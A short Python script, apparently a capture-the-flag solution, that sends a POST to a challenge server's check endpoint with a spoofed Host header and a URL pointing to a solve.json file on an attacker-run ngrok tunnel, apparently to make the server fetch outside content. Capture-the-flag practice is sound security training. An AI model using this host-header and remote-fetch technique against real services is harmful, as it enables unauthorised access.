import requests

URL = "http://chal.competitivecyber.club:9090/"
print(
	requests.post(
		URL + "check",
		headers={"Host": "4c8f-128-211-248-192.ngrok-free.app"},
		data={"url": "https://4c8f-128-211-248-192.ngrok-free.app/solve.json"},
	).text
)
